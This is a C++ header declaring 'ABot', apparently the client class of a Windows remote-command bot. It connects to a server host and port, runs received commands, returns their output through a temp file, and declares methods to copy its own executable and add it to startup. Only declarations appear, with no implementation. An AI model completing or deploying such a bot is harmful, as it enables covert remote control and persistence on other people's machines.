#pragma once
#include "ahxrwinsock.h"

class ABot {
public:
    ABot(const char* str_host, const char* str_port);

    ABot() {};

    void start(FPCLIENT_CB static_on_client_connect, FP_RES static_on_client_rec_data);

    virtual void on_client_connect();

    virtual void on_client_rec_data(char* data) = 0;

protected:
    const char* str_host; // server host

    const char* str_port; // server port

    char c_current_path[MAX_PATH]; // path to current file

    char c_cmd_dir[MAX_PATH];

    TCHAR str_temp[MAX_PATH]; // Temporary path for returning cmd response

    TCHAR str_windows[MAX_PATH]; // System directory path

    std::string s_current_path; // Directory path of the executed location

    bool b_cmd; // whether or not it should process a command

    AHXRCLIENT client; // the AHXR client

    void copy_executable();

    void add_executable_to_start_up();
};